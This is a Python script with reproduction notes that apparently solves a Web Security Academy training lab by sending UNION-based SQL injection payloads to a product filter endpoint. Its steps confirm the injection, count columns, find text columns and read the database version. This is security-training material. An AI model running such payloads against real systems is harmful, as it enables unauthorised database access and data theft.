#!/usr/bin/env python3

import requests, re

URL = 'https://0a4d00d3032a7292818cb14a00ec0041.web-security-academy.net/filter'

def run():
    payload = "Gifts' union select @@version, null#"
    r = requests.get(URL, params={'category': payload})
    body = r.text
    print(f'[*] Payload: {payload}')
    print(f'[*] Status: {r.status_code}')

    if r.status_code == 500:
        print('[!] Error → SQL confirmed / bad syntax')

    if re.search(r'Congratulations|solved the lab', body):
        print('[✓] SOLVED')

    hint = re.findall(r'<p id="hint">(.*?)</p>', body)
    if hint:
        print(f'[*] Hint: {hint[0]}')

    items = re.findall(r'<t[hd]>(.*?)</t[hd]>', body)
    if items:
        print(f'[✓] Found {len(items)} list:')
        for item in items:
            clean = item.strip()
            if clean:
                print(f' → {clean}')

run()


"""
Steps to Reproduce

1. Open browser and access to this endpoint:`/filter?category=Gifts`
2. Determine sql injection by use this patload: `Gifts'#`.
3. Determine how may columns by use this patload: `Gifts' order by 2#` (Found 2 columns).
4. Determine which column are contain text by use this patload: `Gifts' union select 'hacked', 'hacked'#` (Both column is contain text).
5. Determine database version by use this payload: `Gifts' union select @@version, null#`
"""